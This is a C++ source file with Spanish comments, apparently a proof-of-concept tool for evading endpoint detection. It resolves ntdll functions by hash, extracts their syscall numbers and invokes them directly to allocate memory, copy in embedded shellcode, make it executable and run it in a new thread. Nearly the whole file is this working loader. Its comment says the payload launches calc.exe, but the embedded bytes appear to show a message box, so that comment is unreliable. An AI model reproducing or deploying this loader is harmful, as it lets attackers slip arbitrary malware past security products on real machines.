// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

#include "DefsModule.h"

extern "C" void __fastcall SetCall(WORD CallValue);

extern "C" NTSTATUS __fastcall CallFunc(...);


#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)

// Struct
typedef struct _FUNC_VAL
{
    ULONG magic_number;
    WORD call_number;
} FUNC_VAL, * PFUNC_VAL;


// Environment
PTEB GetEnvironmentThreadBlock()
{
    return (PTEB)__readgsqword(0x30);
}


// Calculate the dbj2 to get function
unsigned int Calculacion(const char* str) {
    unsigned int hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }

    return hash;
}

// Get the function from the DLL Base
BOOL GetFunctionFrom(PVOID dllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PFUNC_VAL value) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR FunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (Calculacion(FunctionName) == value->magic_number)
        {
            print("[+] Funcion encontrada: %s", FunctionName);


            WORD cw = 0;
            while (TRUE) {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    value->call_number = (high << 8) | low;
                    break;
                }

                cw++;
            }

            print("[+] El Syscall: %d", value->call_number);

            return TRUE;
        }
    }

    return FALSE;
}


// Get the image
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {


    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }


    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }


    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}


PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


// Entry Point
int main()
{
    PTEB pCurrentTeb = GetEnvironmentThreadBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    
    NTSTATUS status;

    if (!pCurrentTeb || !pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
    {
        print("[-] Error On getting TEB and PEB");
        return -1;
    }

    print("[+] Replicando chido");

    // Get Ntdll module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
    {
        print("[-] No se obtuvo Modulo de NTDLL");
        return -1;
    }

    print("[+] Se obtuvo modulo de NTDLL");

    // Functions to export
    FUNC_VAL firstFunction = { 0 };   // NtAllocateVirtualMemory
    FUNC_VAL secondFunction = { 0 };  // NtProtectVirtualMemory
    FUNC_VAL thirdFunction = { 0 };   // NtFreeVirtualMemory
    FUNC_VAL fourthFunction = { 0 };  // NtCreateThreadEx
    FUNC_VAL fifthFunction = { 0 };   // NtWaitForSingleObject

    firstFunction.magic_number = 0x6793c34c;   // NtAllocateVirtualMemory
    secondFunction.magic_number = 0x82962c8;   // NtProtectVirtualMemory
    thirdFunction.magic_number = 0x471aa7e9;   // NtFreeVirtualMemory
    fourthFunction.magic_number = 0xcb0c2130;  // NtCreateThreadEx
    fifthFunction.magic_number = 0x4c6dc63c;   // NtWaitForSingleObject

    // Get functions
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &secondFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &thirdFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &fourthFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &fifthFunction);

    // Payload (calc.exe para pruebas)
    unsigned char payload[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31"
        "\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
        "\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
        "\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x05"
        "\x00\x00\x00\x48\x6f\x6c\x61\x00\x5a\xe8\x05\x00\x00\x00"
        "\x54\x65\x73\x74\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83"
        "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
        "\xd5";

    PVOID pAddr = NULL;
    SIZE_T payload_size = sizeof(payload);
    SIZE_T real_size = payload_size;
    ULONG ulOldProtect = 0;

    // Allocate memory
    print("[*] Asignando memoria RW...");
    SetCall(firstFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0)
    {
        print("[-] Error en NtAllocateVirtualMemory: 0x%08X", status);
        return -1;
    }

    print("[+] Memoria asignada en: 0x%p", pAddr);
    print("[+] Size: %zu bytes", real_size);

    // Copy payload
    print("[*] Copiando payload...");
    CopyMem(pAddr, (PVOID)payload, real_size);
    print("[+] Payload copiado");

    // Change permissions
    print("[*] Cambiando permisos a RX...");
    SetCall(secondFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &real_size, PAGE_EXECUTE_READ, &ulOldProtect);

    if (status != 0)
    {
        print("[-] Error cambiando permisos: 0x%08X", status);
        return -1;
    }

    print("[+] Permisos cambiados exitosamente");

    // CORRECCIÓN: Crear hilo remoto correctamente
    HANDLE hHostThread = NULL;
    DWORD dwThreadId = 0;

    print("[*] Creando hilo remoto...");

    
    SetCall(fourthFunction.call_number);

        // NtCreateThreadEx tiene 11 parámetros
        // NTSTATUS NtCreateThreadEx(
        //   PHANDLE ThreadHandle,
        //   ACCESS_MASK DesiredAccess,
        //   POBJECT_ATTRIBUTES ObjectAttributes,
        //   HANDLE ProcessHandle,
        //   LPTHREAD_START_ROUTINE lpStartAddress,
        //   LPVOID lpParameter,
        //   ULONG CreateFlags,
        //   SIZE_T ZeroBits,
        //   SIZE_T StackSize,
        //   SIZE_T MaximumStackSize,
        //   PPS_ATTRIBUTE_LIST AttributeList
        // );

    status = CallFunc(&hHostThread,
        THREAD_ALL_ACCESS,
        NULL,
        (HANDLE)-1,  // Current process
        pAddr,       // Start routine
        NULL,        // Parameter
        FALSE,       // Create suspended?
        0,           // Zero bits
        0,           // Stack size
        0,           // Max stack size
        NULL);       // Attribute list

    if (status != 0) {
        print("[-] Error en NtCreateThreadEx: 0x%08X", status);
        return -1;
    }
    
    print("[+] Hilo creado (handle: 0x%p)", hHostThread);

    // Wait for thread completion
    print("[*] Esperando a que termine el hilo...");
    SetCall(fifthFunction.call_number);
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10000000;  // 1 segundo

    status = CallFunc(hHostThread, FALSE, &timeout);

    if (status == 0x102) {  // STATUS_TIMEOUT
        print("[!] Timeout - el hilo sigue ejecutandose");
    }
    else if (status != 0) {
        print("[-] Error en NtWaitForSingleObject: 0x%08X", status);
    }
    else {
        print("[+] Hilo terminado exitosamente");
    }

    // Cleanup
    CloseHandle(hHostThread);

    // Free memory
    print("[*] Liberando memoria...");
    SetCall(thirdFunction.call_number);
    SIZE_T free_size = 0;
    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);

    if (status != 0) {
        print("[-] Error liberando memoria: 0x%08X", status);
    }
    else {
        print("[+] Memoria liberada exitosamente");
    }

    print("[+] Programa finalizado");

    return 0;
}